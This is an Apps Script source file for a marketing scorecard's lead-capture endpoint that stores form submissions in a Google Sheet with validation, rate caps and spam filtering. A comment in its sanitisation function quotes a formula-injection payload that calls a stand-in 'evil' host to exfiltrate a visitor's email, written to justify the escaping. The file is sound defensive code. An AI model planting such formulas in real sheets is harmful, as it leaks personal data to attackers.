/**
 * Trust-First Content Scorecard - lead capture endpoint  ·  v2
 * Google Apps Script, deployed as a web app.
 *
 * WHAT CHANGED FROM v1, AND WHY v1 COULD NOT SHIP
 * v1 called SpreadsheetApp.getActiveSpreadsheet(). There is no active
 * spreadsheet inside doGet/doPost - a web app runs with no open container - so
 * that call returns null and the first property access throws. v1's try/catch
 * then returned {ok:false}, and because the front end posts in 'opaque' mode it
 * cannot read the reply. Every visitor would have seen the Scorecard open
 * normally while nothing whatsoever was saved. Silent, total data loss behind a
 * success-looking UI.
 *
 * v2 opens the spreadsheet by ID from Script Properties and addresses each
 * finding recorded in docs/16-scorecard-endpoint-hardening.md.
 *
 * SETUP (owner, once, about five minutes)
 *   1. Create a Google Sheet, e.g. "Sklarz Creative - Scorecard leads".
 *      Copy its ID from the URL:
 *        docs.google.com/spreadsheets/d/<THIS PART>/edit
 *   2. Extensions -> Apps Script. Delete the placeholder. Paste this file.
 *   3. Paste your ID into SETUP_SPREADSHEET_ID below. Then select
 *      setupCaptureEndpoint in the function dropdown and run it. Authorise when
 *      prompted. Read the log: it must say SETUP COMPLETE. It creates and
 *      verifies three tabs - Leads, Spam, Analytics - installs headers, freezes
 *      them, and REFUSES to touch a tab whose headers do not match. It never
 *      deletes or overwrites data.
 *   4. Deploy -> New deployment -> Web app.
 *        Execute as:     Me
 *        Who has access: Anyone
 *      "Anyone" is required - visitors are not signed in to Google. The /exec
 *      URL is a write-only endpoint, not a credential.
 *   5. Open the /exec URL in a browser. It must return
 *      {"ok":true,"configured":true,...} with all three tabs true.
 *   6. Only then paste the /exec URL into window.TFCS_CAPTURE.endpoint in the
 *      Scorecard page, leaving mode as 'opaque'.
 *
 * RESETTING
 * Do NOT delete the first row of a tab. Headers and the column map derive from
 * the same constants, so a tab with no header row is corrupt, not fresh. To
 * reset, delete the whole TAB and re-run setupCaptureEndpoint, which recreates
 * it. To move to a different spreadsheet, change SETUP_SPREADSHEET_ID and
 * re-run setup.
 *
 * WHERE ROWS GO
 *   Leads      valid, non-spam captures. Make.com reads ONLY this tab, and
 *              filters follow_up_opt_in = "yes" AND spam_reason blank.
 *   Spam       honeypot hits, too-fast posts, invalid email or name, oversized
 *              or malformed payloads. Never read by Make.com.
 *   Analytics  completions with no matching lead - anonymous, or arriving
 *              before their capture. No name, no email, ever.
 *
 * No secret goes near the front end. The spreadsheet ID lives in Script
 * Properties, not in public HTML.
 */

/* ------------------------------------------------------- CONFIGURATION -- */

/** Paste your spreadsheet ID here, run setupCaptureEndpoint once, and it is
 *  then stored in Script Properties and this constant is no longer consulted. */
var SETUP_SPREADSHEET_ID = '';

var PROP_SPREADSHEET_ID = 'TFCS_SPREADSHEET_ID';
var VERSION             = '2.0.0';

var TAB_LEADS     = 'Leads';
var TAB_SPAM      = 'Spam';
var TAB_ANALYTICS = 'Analytics';

/** The consent wording in force. Bump this when the opt-in label changes, so a
 *  record always says what the person actually agreed to. */
var CONSENT_VERSION = '2026-08-25.1';

/** Reject anything larger before parsing. A legitimate capture is ~600 bytes. */
var MAX_BODY_BYTES = 4096;

/** A submission faster than this is not a human filling in two fields. */
var MIN_DWELL_MS = 1500;

/** Wait this long for the script lock before giving up and asking for a retry. */
var LOCK_TIMEOUT_MS = 12000;

/* Daily write ceilings. Finding 2 could not be deferred: without a ceiling a
   flood exhausts the ~20k/day Apps Script execution quota and legitimate
   submissions then fail, which is one of the outcomes deferral was conditioned
   on. These caps bound sheet growth and write cost.

   They do NOT stop execution-quota exhaustion, because the runtime charges for
   the invocation before this code can decline it. That residual risk is
   inherent to Apps Script and is recorded in docs/16. */
var MAX_LEAD_WRITES_PER_DAY = 2000;
var MAX_SPAM_WRITES_PER_DAY = 300;
/* Analytics needs its own ceiling. A well-formed result event with an unknown
   submission id passes every spam check and every score check, so without this
   an attacker could bypass the Leads and Spam caps entirely by sending valid
   anonymous completions. */
var MAX_ANALYTICS_WRITES_PER_DAY = 1000;
var PROP_COUNTER_PREFIX = 'TFCS_COUNT_';

/* The scorecard contract, derived from the front end.
   Five categories, four statements each, each scored 0/1/2. A category is
   therefore 0-8 and the total 0-40, and the total must equal the sum of the
   five. Bands and the weakest-signal string are recomputed here and compared
   with what was submitted: a payload that disagrees with itself is rejected. */
var CATEGORIES     = ['clarity', 'consistency', 'credibility', 'connection', 'conversion'];
var CATEGORY_NAMES = ['Clarity', 'Consistency', 'Credibility', 'Connection', 'Conversion'];
var CATEGORY_MAX   = 8;
var TOTAL_MAX      = 40;

/** Thresholds and labels exactly as the front end renders them. */
var BANDS = [
  { min: 32, label: 'Strong trust system' },
  { min: 24, label: 'Solid foundation' },
  { min: 16, label: 'Inconsistent signals' },
  { min: 0,  label: 'Rebuild the basics' }
];

/* ------------------------------------------------------------- HEADERS -- */

/* The nine score columns stay contiguous so a result is one setValues() call
   rather than nine setValue() round trips. Do not reorder them. */
var SCORE_BLOCK = ['total_score', 'clarity', 'consistency', 'credibility',
                   'connection', 'conversion', 'weakest_signal', 'band',
                   'completed_at'];

var LEADS_HEADERS = [
  'timestamp', 'submission_id', 'first_name', 'email',
  'follow_up_opt_in', 'consent_version', 'consent_at',
  'resource', 'page',
  'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
  'dwell_ms'
].concat(SCORE_BLOCK).concat(['spam_reason', 'sequence_state']);

var SPAM_HEADERS = [
  'timestamp', 'submission_id', 'first_name', 'email',
  'follow_up_opt_in', 'consent_version', 'consent_at',
  'resource', 'page',
  'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term',
  'dwell_ms', 'spam_reason'
];

var ANALYTICS_HEADERS = [
  'timestamp', 'submission_id', 'resource', 'page',
  'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term'
].concat(SCORE_BLOCK).concat(['merged_to_lead']);

var TABS = [
  { name: TAB_LEADS,     headers: LEADS_HEADERS },
  { name: TAB_SPAM,      headers: SPAM_HEADERS },
  { name: TAB_ANALYTICS, headers: ANALYTICS_HEADERS }
];

function colOf_(headers, name) { return headers.indexOf(name) + 1; }

/* --------------------------------------------------------------- SETUP -- */

/**
 * Run once, from the editor, as the owner. Idempotent and non-destructive.
 * Refuses to adopt a tab whose header row is not exactly what this code
 * expects, because writing into a differently-shaped tab corrupts it silently.
 */
function setupCaptureEndpoint() {
  var props = PropertiesService.getScriptProperties();
  var id = String(SETUP_SPREADSHEET_ID || props.getProperty(PROP_SPREADSHEET_ID) || '').trim();

  if (!id) {
    throw new Error('SETUP FAILED - paste your spreadsheet ID into ' +
      'SETUP_SPREADSHEET_ID at the top of this file, then run this again.');
  }

  var ss;
  try {
    ss = SpreadsheetApp.openById(id);
  } catch (err) {
    throw new Error('SETUP FAILED - could not open a spreadsheet with ID "' + id +
      '". Check the ID is the part of the URL between /d/ and /edit, and that ' +
      'this account can open it.');
  }

  var report = [];
  for (var i = 0; i < TABS.length; i++) {
    report.push(ensureTab_(ss, TABS[i].name, TABS[i].headers));
  }

  props.setProperty(PROP_SPREADSHEET_ID, id);

  var summary = 'SETUP COMPLETE\nSpreadsheet: ' + ss.getName() + '\n' + report.join('\n') +
    '\n\nNext: Deploy -> New deployment -> Web app (Execute as: Me, Who has access: ' +
    'Anyone), then open the /exec URL and confirm configured:true with all three ' +
    'tabs true.';
  Logger.log(summary);
  return summary;
}

function ensureTab_(ss, name, headers) {
  var sheet = ss.getSheetByName(name);

  if (!sheet) {
    sheet = ss.insertSheet(name);
    writeHeaders_(sheet, headers);
    return '  created  ' + name + ' (' + headers.length + ' columns)';
  }

  if (sheet.getLastRow() === 0) {
    writeHeaders_(sheet, headers);
    return '  headers  ' + name + ' (was empty)';
  }

  var existing = sheet.getRange(1, 1, 1, Math.max(sheet.getLastColumn(), 1)).getValues()[0];
  while (existing.length && existing[existing.length - 1] === '') existing.pop();

  if (existing.join('|') === headers.join('|')) {
    if (sheet.getFrozenRows() < 1) sheet.setFrozenRows(1);
    return '  verified ' + name + ' (' + Math.max(sheet.getLastRow() - 1, 0) + ' data rows)';
  }

  throw new Error('SETUP FAILED - the tab "' + name + '" already exists with ' +
    'different headers, and this script will not overwrite it.\n' +
    '  found:    ' + existing.join(', ') + '\n' +
    '  expected: ' + headers.join(', ') + '\n' +
    'Rename or delete that tab and run setup again. Deleting only the header ' +
    'row is not a reset and will not work.');
}

function writeHeaders_(sheet, headers) {
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]).setFontWeight('bold');
  sheet.setFrozenRows(1);
}

/* ------------------------------------------------------------- RUNTIME -- */

/**
 * Date-stamped counters in Script Properties. Returns false once the day's
 * ceiling is reached, so the flood stops costing sheet rows and write quota.
 */
function underDailyCap_(kind, cap) {
  try {
    var props = PropertiesService.getScriptProperties();
    var day = Utilities.formatDate(new Date(), 'Etc/UTC', 'yyyy-MM-dd');
    var key = PROP_COUNTER_PREFIX + kind + '_' + day;
    var n = Number(props.getProperty(key) || 0) + 1;
    props.setProperty(key, String(n));
    if (n > cap) {
      console.error('daily_cap_reached kind=%s cap=%s', kind, cap);
      return false;
    }
    return true;
  } catch (err) {
    console.error('counter_unavailable kind=%s', kind);
    return true;                 /* fail open: never lose a real lead to this */
  }
}

function book_() {
  var id = PropertiesService.getScriptProperties().getProperty(PROP_SPREADSHEET_ID);
  if (!id) throw new Error('not_configured');
  return SpreadsheetApp.openById(id);
}

function tab_(ss, name) {
  var sheet = ss.getSheetByName(name);
  if (!sheet) throw new Error('missing_tab:' + name);
  if (sheet.getLastRow() === 0) throw new Error('missing_headers:' + name);
  return sheet;
}

/* -------------------------------------------------------- SANITISATION -- */

/**
 * Every user-controlled string passes through here before it reaches a cell.
 *
 * Sheets treats a leading = + - @ as a formula, so an unescaped first_name of
 * =IMPORTXML("https://evil/?x="&D2,"//a") executes when the sheet is opened and
 * exfiltrates the adjacent email. A leading apostrophe forces Sheets to store
 * the value as literal text. Control characters are flattened to spaces because
 * they break CSV export and can fake column boundaries downstream.
 */
function safe_(value, maxLength) {
  var s = String(value == null ? '' : value);
  s = s.replace(/[\u0000-\u001F\u007F]/g, ' ');
  s = s.slice(0, maxLength);
  /* Sheets trims leading whitespace before deciding whether a cell is a
     formula, so " =IMPORTDATA(...)" and a tab or newline followed by "=" are
     just as dangerous as a bare leading "=". Testing only the first character
     misses all of them. Control characters are flattened to spaces above, so
     one leading-whitespace test covers tabs and newlines too. */
  if (/^\s*[=+\-@]/.test(s)) s = "'" + s;
  return s;
}

var UUID_RE     = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
var FALLBACK_RE = /^tfcs-[0-9a-z]{1,14}-[0-9a-z]{1,10}$/i;
var EMAIL_RE    = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
var ISO_RE      = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d{1,3})?Z?$/;

function validId_(id) {
  var s = String(id || '');
  return (UUID_RE.test(s) || FALLBACK_RE.test(s)) ? s : '';
}

/* ---------------------------------------------------------- VALIDATION -- */

function bandFor_(total) {
  for (var i = 0; i < BANDS.length; i++) if (total >= BANDS[i].min) return BANDS[i].label;
  return BANDS[BANDS.length - 1].label;
}

function weakestFor_(values) {
  var min = Math.min.apply(null, values), names = [];
  for (var i = 0; i < values.length; i++) if (values[i] === min) names.push(CATEGORY_NAMES[i]);
  return names.join(' / ');
}

/* Strict: a real JavaScript number, finite, integral. Rejects numeric strings,
   empty strings, null, undefined, booleans, NaN and Infinity. typeof NaN is
   'number', so the isFinite test is what excludes it. */
function isInt_(n) { return typeof n === 'number' && isFinite(n) && Math.floor(n) === n; }

/**
 * A result must be internally consistent, not merely well-typed. The total has
 * to equal the sum, the band has to be the band that total produces, and the
 * weakest signal has to name the categories that actually scored lowest. A
 * payload that disagrees with itself was not produced by the instrument.
 */
function validateScores_(body) {
  var values = [];
  for (var i = 0; i < CATEGORIES.length; i++) {
    /* Deliberately NOT Number(). Coercing first accepts "7", "", true and null
       as valid scores — a client that sends the wrong type is a client whose
       output should not be trusted, not one to be quietly repaired. */
    var v = body[CATEGORIES[i]];
    if (!isInt_(v) || v < 0 || v > CATEGORY_MAX) {
      return { ok: false, reason: 'bad_category:' + CATEGORIES[i] };
    }
    values.push(v);
  }

  var total = body.total;
  if (!isInt_(total) || total < 0 || total > TOTAL_MAX) return { ok: false, reason: 'bad_total' };

  var sum = 0;
  for (var j = 0; j < values.length; j++) sum += values[j];
  if (sum !== total) return { ok: false, reason: 'total_mismatch' };

  if (String(body.band || '') !== bandFor_(total)) return { ok: false, reason: 'band_mismatch' };

  var weakest = String(body.weakest_signal || '');
  if (weakest !== weakestFor_(values)) return { ok: false, reason: 'weakest_mismatch' };

  var completedAt = String(body.completed_at || '');
  if (completedAt && !ISO_RE.test(completedAt)) return { ok: false, reason: 'bad_completed_at' };

  return {
    ok: true,
    row: [total].concat(values).concat([weakest, bandFor_(total), completedAt])
  };
}

function spamReason_(body) {
  if (body.company_website) return 'honeypot';
  var dwell = Number(body.dwell_ms);
  if (isFinite(dwell) && dwell > 0 && dwell < MIN_DWELL_MS) return 'too_fast';
  if (!EMAIL_RE.test(String(body.email || ''))) return 'bad_email';
  if (!String(body.first_name || '').trim()) return 'no_name';
  if (!validId_(body.submission_id)) return 'bad_submission_id';
  return '';
}

/* ------------------------------------------------------------ HANDLERS -- */

function doPost(e) {
  var lock = LockService.getScriptLock();
  try {
    if (!lock.tryLock(LOCK_TIMEOUT_MS)) {
      console.error('lock_timeout');
      return reply_({ ok: false, error: 'busy' });
    }
  } catch (lockErr) {
    console.error('lock_unavailable');
    return reply_({ ok: false, error: 'busy' });
  }

  try {
    var raw = (e && e.postData && e.postData.contents) ? String(e.postData.contents) : '';
    if (!raw) { console.error('empty_body'); return reply_({ ok: false }); }

    if (raw.length > MAX_BODY_BYTES) {
      console.error('oversized_body bytes=%s', raw.length);
      recordSpam_({}, 'oversized');
      return reply_({ ok: false });
    }

    var body;
    try {
      body = JSON.parse(raw);
    } catch (parseErr) {
      console.error('bad_json');
      recordSpam_({}, 'bad_json');
      return reply_({ ok: false });
    }
    if (!body || typeof body !== 'object' || Array.isArray(body)) {
      console.error('bad_body_shape');
      return reply_({ ok: false });
    }

    var event = String(body.event || '');
    if (event === 'capture') return reply_(handleCapture_(body));
    if (event === 'result')  return reply_(handleResult_(body));

    console.error('unknown_event');
    return reply_({ ok: false });

  } catch (err) {
    /* Reason codes only. Never a stack trace, never submitted content. */
    console.error('unhandled error=%s', String(err && err.message).slice(0, 120));
    return reply_({ ok: false });
  } finally {
    try { lock.releaseLock(); } catch (releaseErr) { /* already released */ }
  }
}

/**
 * A harmless health check. Confirms the script is configured and can reach its
 * three tabs. Exposes no rows, no identifiers, and no counts.
 */
function doGet() {
  var out = { ok: true, version: VERSION, configured: false, spreadsheet: false, tabs: {} };
  try {
    var ss = book_();
    out.configured = true;
    out.spreadsheet = true;
    for (var i = 0; i < TABS.length; i++) {
      var sheet = ss.getSheetByName(TABS[i].name);
      out.tabs[TABS[i].name] = !!(sheet && sheet.getLastRow() > 0);
    }
    out.ok = !!(out.tabs[TAB_LEADS] && out.tabs[TAB_SPAM] && out.tabs[TAB_ANALYTICS]);
  } catch (err) {
    out.ok = false;
    out.error = String(err && err.message) === 'not_configured' ? 'not_configured' : 'unavailable';
    console.error('health_check error=%s', out.error);
  }
  return reply_(out);
}

/* -------------------------------------------------------------- WRITES -- */

function baseFields_(body) {
  return {
    submission_id:    validId_(body.submission_id),
    first_name:       safe_(body.first_name, 120),
    email:            safe_(body.email, 240),
    follow_up_opt_in: body.follow_up_opt_in === 'yes' ? 'yes' : 'no',
    resource:         safe_(body.resource, 120),
    page:             safe_(body.page, 240),
    utm_source:       safe_(body.utm_source, 120),
    utm_medium:       safe_(body.utm_medium, 120),
    utm_campaign:     safe_(body.utm_campaign, 120),
    utm_content:      safe_(body.utm_content, 120),
    utm_term:         safe_(body.utm_term, 120),
    dwell_ms:         isFinite(Number(body.dwell_ms)) ? Number(body.dwell_ms) : ''
  };
}

function rowFrom_(headers, map) {
  var row = [];
  for (var i = 0; i < headers.length; i++) {
    row.push(map.hasOwnProperty(headers[i]) ? map[headers[i]] : '');
  }
  return row;
}

function recordSpam_(body, reason) {
  if (!underDailyCap_('spam', MAX_SPAM_WRITES_PER_DAY)) return;
  try {
    var sheet = tab_(book_(), TAB_SPAM);
    var f = baseFields_(body || {});
    f.timestamp = new Date();
    f.consent_version = CONSENT_VERSION;
    f.consent_at = '';
    f.spam_reason = reason;
    sheet.appendRow(rowFrom_(SPAM_HEADERS, f));
  } catch (err) {
    console.error('spam_write_failed reason=%s', reason);
  }
}

function handleCapture_(body) {
  var reason = spamReason_(body);
  if (reason) {
    console.error('capture_rejected reason=%s', reason);
    recordSpam_(body, reason);
    /* Deliberately {ok:true}: a bot learns nothing from the reply, and a false
       positive still gets the Scorecard. The row is in Spam, never in Leads. */
    return { ok: true };
  }

  if (!underDailyCap_('lead', MAX_LEAD_WRITES_PER_DAY)) {
    return { ok: false, error: 'busy' };
  }

  var ss = book_();
  var leads = tab_(ss, TAB_LEADS);
  var id = validId_(body.submission_id);

  if (findRow_(leads, LEADS_HEADERS, id)) {
    console.error('capture_duplicate');
    return { ok: true };                        /* idempotent, not an error */
  }

  var now = new Date();
  var f = baseFields_(body);
  f.timestamp = now;
  f.consent_version = CONSENT_VERSION;
  f.consent_at = f.follow_up_opt_in === 'yes' ? now : '';
  f.spam_reason = '';
  f.sequence_state = '';

  var pending = takePendingResult_(ss, id);     /* result-before-capture race */
  if (pending) {
    for (var i = 0; i < SCORE_BLOCK.length; i++) f[SCORE_BLOCK[i]] = pending[i];
  }

  leads.appendRow(rowFrom_(LEADS_HEADERS, f));
  return { ok: true };
}

function handleResult_(body) {
  var scores = validateScores_(body);
  if (!scores.ok) {
    console.error('result_rejected reason=%s', scores.reason);
    return { ok: false };                       /* never written anywhere */
  }

  var ss = book_();
  var id = validId_(body.submission_id);

  if (id) {
    var leads = tab_(ss, TAB_LEADS);
    var rowIndex = findRow_(leads, LEADS_HEADERS, id);
    if (rowIndex) {
      var startCol = colOf_(LEADS_HEADERS, SCORE_BLOCK[0]);
      var existing = leads.getRange(rowIndex, startCol, 1, SCORE_BLOCK.length).getValues()[0];

      /* A completed result is immutable. The front end can legitimately resend
         the same result — a reload restores the submission id from
         localStorage and re-scores — so an identical retry must succeed
         quietly. A DIFFERENT result for a lead that already completed is
         either corruption or an attempt to overwrite someone's record, and the
         original wins. */
      if (isCompleted_(existing)) {
        if (sameScores_(existing, scores.row)) {
          return { ok: true, note: 'already_recorded' };
        }
        console.error('result_conflict rowIndex=%s', rowIndex);
        return { ok: false, error: 'already_completed' };
      }

      /* One batch write. Nine setValue() calls could interleave and tear. */
      leads.getRange(rowIndex, startCol, 1, SCORE_BLOCK.length).setValues([scores.row]);
      return { ok: true };
    }
  }

  /* No matching lead. Never fabricate one - record the completion anonymously. */
  writeAnalytics_(ss, id, body, scores.row);
  return { ok: true };
}

/** Anonymous completions. No name, no email, by construction. */
function writeAnalytics_(ss, id, body, scoreRow) {
  if (!underDailyCap_('analytics', MAX_ANALYTICS_WRITES_PER_DAY)) return false;
  var sheet = tab_(ss, TAB_ANALYTICS);
  var f = {
    timestamp:      new Date(),
    submission_id:  id,
    resource:       safe_(body.resource, 120) || 'Trust-First Content Scorecard',
    page:           safe_(body.page, 240),
    utm_source:     safe_(body.utm_source, 120),
    utm_medium:     safe_(body.utm_medium, 120),
    utm_campaign:   safe_(body.utm_campaign, 120),
    utm_content:    safe_(body.utm_content, 120),
    utm_term:       safe_(body.utm_term, 120),
    merged_to_lead: ''
  };
  for (var i = 0; i < SCORE_BLOCK.length; i++) f[SCORE_BLOCK[i]] = scoreRow[i];
  sheet.appendRow(rowFrom_(ANALYTICS_HEADERS, f));
  return true;
}

/**
 * The front end fires the capture and the result without awaiting the first, so
 * a result can land before its lead exists. Rather than splitting one person
 * across two rows, that result waits in Analytics and is claimed here.
 */
function takePendingResult_(ss, id) {
  if (!id) return null;
  var sheet = tab_(ss, TAB_ANALYTICS);
  var rowIndex = findRow_(sheet, ANALYTICS_HEADERS, id);
  if (!rowIndex) return null;

  var mergedCol = colOf_(ANALYTICS_HEADERS, 'merged_to_lead');
  if (String(sheet.getRange(rowIndex, mergedCol).getValue())) return null;  /* claimed */

  var startCol = colOf_(ANALYTICS_HEADERS, SCORE_BLOCK[0]);
  var scores = sheet.getRange(rowIndex, startCol, 1, SCORE_BLOCK.length).getValues()[0];
  sheet.getRange(rowIndex, mergedCol).setValue('yes');
  return scores;
}

/* A row counts as completed once its total_score cell holds a real number.
   Blank, empty string or text means the scores were never written. */
function isCompleted_(scoreRow) {
  var total = scoreRow[SCORE_BLOCK.indexOf('total_score')];
  return typeof total === 'number' && isFinite(total);
}

/* Compare a stored score row with an incoming one. Sheets returns numbers as
   numbers and text as strings, and completed_at may be stored as a Date, so
   compare loosely by string value rather than by identity. */
function sameScores_(a, b) {
  for (var i = 0; i < SCORE_BLOCK.length; i++) {
    var x = a[i], y = b[i];
    if (x instanceof Date) x = x.toISOString();
    if (y instanceof Date) y = y.toISOString();
    if (String(x == null ? '' : x) !== String(y == null ? '' : y)) return false;
  }
  return true;
}

function findRow_(sheet, headers, id) {
  if (!id) return 0;
  var last = sheet.getLastRow();
  if (last < 2) return 0;
  var col = colOf_(headers, 'submission_id');
  var ids = sheet.getRange(2, col, last - 1, 1).getValues();
  for (var i = ids.length - 1; i >= 0; i--) {      /* newest first */
    if (String(ids[i][0]) === id) return i + 2;
  }
  return 0;
}

function reply_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
